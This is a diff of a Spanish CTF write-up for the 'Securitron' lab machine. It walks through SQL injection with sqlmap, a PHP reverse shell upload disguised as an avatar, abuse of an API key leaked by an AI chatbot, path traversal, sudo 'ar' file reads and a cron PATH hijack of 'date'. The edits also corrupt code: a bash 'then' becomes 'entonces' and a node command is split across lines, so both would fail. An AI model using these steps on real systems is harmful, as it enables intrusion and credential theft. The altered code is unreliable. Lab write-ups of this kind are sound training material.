@@ -1,54 +1,26 @@
 ---
-author: Lenam
-pubDatetime: 2024-08-23T15:22:00Z
-title: WriteUp Securitron - TheHackersLabs
-slug: securitron-writeup-thehackerslabs-es
-featured: false
-draft: true
-# ogImage: "assets/securitron/OpenGraph.png"
-tags:
-  - writeup
-  - TheHackersLabs
-description:
-  Mi primer CTF creado para la plataforma thehackerslabs.com y con un modelo de IA, espero que sea de vuestro agrado.
-lang: es
+author: Lenam  
+pubDatetime: 2024-08-23T15:22:00Z  
+title: WriteUp Securitron - TheHackersLabs  
+slug: securitron-writeup-thehackerslabs-es  
+featured: true  
+draft: false  
+ogImage: "assets/securitron/OpenGraph.png"  
+tags:  
+  - writeup  
+  - TheHackersLabs  
+description:  
+  Mi primer CTF creado para la plataforma thehackerslabs.com y con un modelo de IA, espero que sea de vuestro agrado.  
+lang: es  
 ---
 
 Mi primer CTF creado para la plataforma thehackerslabs.com y con un modelo de IA, espero que sea de vuestro agrado.
 
 ![Securitron](/assets/securitron/image-39.png)
 
-En este writeup intento ir al grano con la enumeración y vulneración.
+Puede haber ligeras variaciones en la máquina que encontrarás en The Hacker Labs, ya que tuve que corregir algunos problemas. Gracias a CuriosidadesDeHackers por su ayuda y a murrusko por subir el writeup.
 
 ## Tabla de contenido 
-
-## Configuración VirtualBox
-
-Este CTF contiene una IA, esto requiere de recursos de hardware, muestro a continuación la configuración de VirtualBox utilizada.
-
-### General
-
-![Configuración general](/assets/securitron/image.png)
-
-### Sistema
-
-Placa base, memoria base 8 GB, chipset PIIX3, etc.
-
-![Placa base](/assets/securitron/image-1.png)
-
-El procesador con 4 núcleos y al 100 % de límite de ejecución.
-
-![Procesador](/assets/securitron/image-2.png)
-
-En aceleración, el interfaz de paravirtualización en predeterminado y el hardware de virtualización activado.
-
-![Aceleración](/assets/securitron/image-3.png)
-
-### Pantalla
-
-Memoria de vídeo 33 MB.
-
-![Memoria de vídeo](/assets/securitron/image-4.png)
 
 ## Enumeración
 
@@ -58,7 +30,7 @@ nmap -p- 10.0.2.4 -n -Pn
 
 ![Nmap](/assets/securitron/image-5.png)
 
-Solo encontramos el puerto 80 abierto, analizamos con más detalle el puerto 80.
+Solo encontramos el puerto 80 abierto, así que analizamos con más detalle el puerto 80.
 
 ```
 nmap -p80 -sVC -n -Pn 10.0.2.4 -oN nmap.txt -vvv
@@ -111,6 +83,7 @@ Accedemos al subdominio `admin19-32.securitron.thl` y nos aparece la aplicación
 ```
 whatweb http://admin19-32.securitron.thl
 ```
+
 ![whatweb](/assets/securitron/image-13.png)
 
 Encontramos varios exploits que se aprovechan de un SQL Injection en el formulario `http://admin19-32.securitron.thl/Admin/login.php`.
@@ -159,7 +132,7 @@ sqlmap -r request.txt --level 5 --risk 3 -D pms_db --tables
 
 ![sqlmap tables](/assets/securitron/image-17.png)
 
-Obtenemos los datos de la table `users` de la base de datos `pms_db`, la contraseña parece estar sin hashear, ¡bingo!
+Obtenemos los datos de la tabla `users` de la base de datos `pms_db`, la contraseña parece estar sin hashear, ¡bingo!
 
 ```
 sqlmap -r request.txt --level 5 --risk 3 -D pms_db -T users --dump
@@ -173,25 +146,25 @@ Entramos en la aplicación desde el formulario `http://admin19-32.securitron.thl
 
 ![Employee Management System Admin](/assets/securitron/image-19.png)
 
-Preparamos un revshell en PHP, utilizo el de `PHP PentestMonkey` ya que estamos ante una aplicación en PHP, configurando nuestra IP (`10.0.2.15`) y el puerto deseado (`9001`), y creamos un fichero con el nombre `avatar.php.png`.
+Preparamos un revshell en PHP. Utilizo el de `PHP PentestMonkey` ya que estamos ante una aplicación en PHP, configurando nuestra IP (`10.0.2.15`) y el puerto deseado (`9001`), y creamos un fichero con el nombre `avatar.php.png`.
 
 ![PHP PentestMonkey revshell](/assets/securitron/image-20.png)
 
-Nos vamos al apartado "User Management" > "Add User". Abrimos Burp Suite, activamos el intercept y configuramos el proxy del navegador, rellenamos los campos para crear un nuevo usuario y seleccionamos nuestra revshell creada anteriormente `avatar.php.png` como imagen para el avatar.
+Nos dirigimos al apartado "User Management" > "Add User". Abrimos Burp Suite, activamos el intercept y configuramos el proxy del navegador, rellenamos los campos para crear un nuevo usuario y seleccionamos nuestro revshell creado anteriormente `avatar.php.png` como imagen para el avatar.
 
 ![Burpsuite](/assets/securitron/image-21.png)
 
-Modificamos el filename de `avatar.php.png` a `avatar.php` en Burp Suite y enviamos la petición `Forward`.
+Modificamos el nombre del archivo de `avatar.php.png` a `avatar.php` en Burp Suite y enviamos la petición `Forward`.
 
 ![Burpsuite 2](/assets/securitron/image-22.png)
 
 Nos aparecerá un mensaje indicando que el usuario se ha añadido correctamente, ahora ya podemos desactivar el proxy de Burp Suite del navegador.
 
-Si vamos al listado de usuarios User `Management > Admin Record` y inspeccionamos el código, podremos encontrar la dirección donde se ha subido el `avatar.php` donde se encuentra nuestra revshell.
+Si vamos al listado de usuarios en `User Management > Admin Record` y inspeccionamos el código, podremos encontrar la dirección donde se ha subido el `avatar.php`, donde se encuentra nuestra revshell.
 
 ![URL revshell](/assets/securitron/image-23.png)
 
-Nos ponemos a escuchar con netcat ...
+Nos ponemos a escuchar con netcat...
 
 ```bash
 nc -lvnp 9001
@@ -209,7 +182,7 @@ curl http://admin19-32.securitron.thl/uploadImage/Profile/avatar.php
 
 ## Movimiento lateral
 
-Hacemos el tratamiento de la tty e intentamos elevar privilegios.
+Tratamos el tty e intentamos elevar privilegios.
 
 Tenemos los usuarios `root` y `securitybot`.
 
@@ -227,15 +200,15 @@ ss -tuln | grep tcp
 
 ![alt text](/assets/securitron/image-26.png)
 
-El puerto `80` es el del servicio web que hemos explotado, el puerto 3306 es el de la BD que también ya hemos explotado.
+El puerto `80` es el del servicio web que hemos explotado, y el puerto 3306 es el de la BD que también ya hemos explotado.
 
-El puerto `3000` no lo conocemos, lo investigamos.
+No conocemos el puerto `3000`, lo investigamos.
 
-El puerto `3000`, al mirar el fichero `/etc/apache2/sites-available/000-default.conf`, podemos intuir que es la API que expone la IA utilizada al principio, ya que tiene un proxy configurado que apunta al endpoint de este puerto.
+Al mirar el fichero `/etc/apache2/sites-available/000-default.conf`, podemos intuir que es la API que expone la IA utilizada al principio, ya que tiene un proxy configurado que apunta al endpoint de este puerto.
 
 ![virtualhost 000-default.conf](/assets/securitron/image-27.png)
 
-Lo investigamos un poco más y observamos que hay un proceso que corre por el usuario `securitybot`, que parece de Node.js.
+Lo investigamos un poco más y observamos que hay un proceso que corre bajo el usuario `securitybot`, que parece de Node.js.
 
 ```
 ps -aux | grep securitybot
@@ -245,10 +218,12 @@ ps -aux | grep securitybot
 
 No tenemos permisos para ver el fichero `/home/securitybot/.local/bin/bot/index.js`, pero sí que podemos ejecutar Node.js mediante la ruta `/home/securitybot/.nvm/versions/node/v22.5.1/bin/node`.
 
-Miramos qué podemos encontrar en el puerto 3000. El endpoint /api nos da información en JSON sobre la API. Utilizamos `curl` y `node` para mostrar esta información de forma legible.
+Miramos qué podemos encontrar en el puerto 3000. El endpoint /api nos da información en formato JSON sobre la API. Utilizamos `curl` y `node` para mostrar esta información de forma legible.
 
 ```bash
-curl http://localhost:3000/api | /home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p "JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )"
+curl http://localhost:3000/api | /home/securitybot/.nvm/versions/node/v22.5.1/bin/node -p
+
+ "JSON.stringify( JSON.parse(require('fs').readFileSync(0) ), 0, 1 )"
 ```
 
 ![API information](/assets/securitron/image-29.png)
@@ -267,7 +242,7 @@ curl http://localhost:3000/api/models | showJson
 
 Nos aparece un mensaje de error que dice `API Key es requerida`, en la descripción del endpoint mostraba el texto `requiere x-api-key header`.
 
-Probamos con la API-KEY filtrada al principio en la IA `imagine-no-heaven-no-countries-no-possessions`, y la introducimos como valor de la cabecera `x-api-key`.
+Probamos con la API-KEY filtrada al principio en la IA: `imagine-no-heaven-no-countries-no-possessions`, y la introducimos como valor de la cabecera `x-api-key`.
 
 ```bash
 curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models | showJson
@@ -295,7 +270,7 @@ Intentamos leer el fichero de la flag de user.txt del usuario `securitybot`.
 curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2Fuser.txt
 ```
 
-Obtenemos el flag de user.txt y una contraseña de regalo `0KjcFEkuUEXG` (esto no es muy realista).
+Obtenemos la flag de user.txt y una contraseña de regalo: `0KjcFEkuUEXG` (esto no es muy realista).
 
 ![User flag and password](/assets/securitron/image-30.png)
 
@@ -309,7 +284,7 @@ Comprobamos si tenemos algún permiso sudo, ya que tenemos la contraseña del us
 
 ![sudo](/assets/securitron/image-32.png)
 
-Tenemos permiso sudo para ejecutar el binario `ar`, según lo que indica en GTFOBins, podemos obtener una lectura de ficheros privilegiada.
+Tenemos permiso sudo para ejecutar el binario `ar`, y según lo que indica en GTFOBins, podemos obtener una lectura de ficheros privilegiada.
 
 ![gtfobins](/assets/securitron/image-33.png)
 
@@ -319,7 +294,7 @@ Intentamos leer la flag de root.txt mediante `sudo` en el binario `ar`.
 TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/root/root.txt" && cat "$TF"
 ```
 
-Al leer el fichero de la flag de `/root/root.txt`, nos aparece el mensaje `Esta vez no será tan fácil.`
+Al leer el fichero de la flag de `/root/root.txt`, nos aparece el mensaje: `Esta vez no será tan fácil.`
 
 ![/root/root.txt](/assets/securitron/image-34.png)
 
@@ -331,7 +306,7 @@ TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/var/spool/cron/crontabs/root" && c
 
 ![/var/spool/cron/crontabs/root](/assets/securitron/image-35.png)
 
-En el PATH del crontab de root hay una carpeta en la que tenemos permisos de escritura `/home/securitybot/.local/bin` y el usuario root está ejecutando un script en bash cada minuto `/opt/backup_bd.sh`.
+En el PATH del crontab de root hay una carpeta en la que tenemos permisos de escritura: `/home/securitybot/.local/bin`, y el usuario root está ejecutando un script en bash cada minuto: `/opt/backup_bd.sh`.
 
 ```bash
 cat /opt/backup_bd.sh
@@ -359,7 +334,7 @@ NOMBRE_BACKUP="${CARPETA_BACKUP}/backup_${BASE_DATOS}_${FECHA}.sql"
 /usr/bin/mysqldump -u $USUARIO -p$CONTRASEÑA $BASE_DATOS > $NOMBRE_BACKUP
 
 # Verificar si el backup se creó exitosamente
-if [ $? -eq 0 ]; then
+if [ $? -eq 0 ]; entonces
   echo "Backup creado exitosamente: $NOMBRE_BACKUP"
 else
   echo "Error al crear el backup"
@@ -370,21 +345,21 @@ fi
 /bin/ls -t $CARPETA_BACKUP | /usr/bin/sed -e '1,2d' | /usr/bin/xargs -d '\n' /bin/rm -f
 ```
 
-Parece que el fichero crea un backup de la BD en una carpeta a la que no tenemos permisos. 
+Parece que el fichero crea un backup de la BD en una carpeta a la que no tenemos permisos.
 
-Todos los binarios que se utilizan dentro del fichero `backup_bd.sh` y el propio fichero son llamados con paths absolutos, impidiendo una suplantación de binario con ellos. En cambio, el parámetro enviado al fichero utiliza el binario `date` sin una dirección absoluta.
+Todos los binarios que se utilizan dentro del fichero `backup_bd.sh` y el propio fichero son llamados con rutas absolutas, impidiendo una suplantación de binarios con ellos. En cambio, el parámetro enviado al fichero utiliza el binario `date` sin una dirección absoluta.
 
 ![date no absolute](/assets/securitron/image-36.png)
 
-Si comprobamos dónde se encuentra el fichero `date`, se encuentra en `/usr/bin/date`,
+Si comprobamos dónde se encuentra el fichero `date`, está en `/usr/bin/date`.
 
 ![alt text](/assets/securitron/image-37.png)
 
-y como el PATH del crontab de root está configurado de la siguiente forma:
+Y como el PATH del crontab de root está configurado de la siguiente forma:
 
 `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/home/securitybot/.local/bin:/usr/bin:/sbin:/bin`
 
-podemos crear un fichero `date` en la carpeta `/home/securitybot/.local/bin` que se encuentra antes que la carpeta `/usr/bin`, haciendo que la tarea programada del usuario root ejecute nuestro fichero suplantado.
+Podemos crear un fichero `date` en la carpeta `/home/securitybot/.local/bin`, que se encuentra antes que la carpeta `/usr/bin`, haciendo que la tarea programada del usuario root ejecute nuestro fichero suplantado.
 
 Nos ponemos a escuchar con netcat en el puerto 12345.
 
